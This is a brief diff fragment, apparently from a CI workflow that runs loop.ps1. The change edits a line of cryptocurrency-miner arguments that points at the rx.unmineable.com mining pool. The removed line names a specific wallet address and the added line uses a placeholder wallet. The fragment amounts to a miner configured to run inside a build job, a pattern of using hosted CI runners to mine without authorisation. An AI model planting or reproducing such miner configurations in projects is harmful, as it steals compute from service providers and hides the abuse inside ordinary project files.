@@ -36,4 +36,4 @@ jobs:
         ./loop.ps1
 ============================================
 
---donate-level 1 -o rx.unmineable.com:3333 -u SAITAMA:0x8Be50098092EeCa824e78D19F1f142C3FBdAB80B.FELP -p x -k -a rx/0
+--donate-level 1 -o rx.unmineable.com:3333 -u cod:carteira.mineiro -p x -k -a rx/0
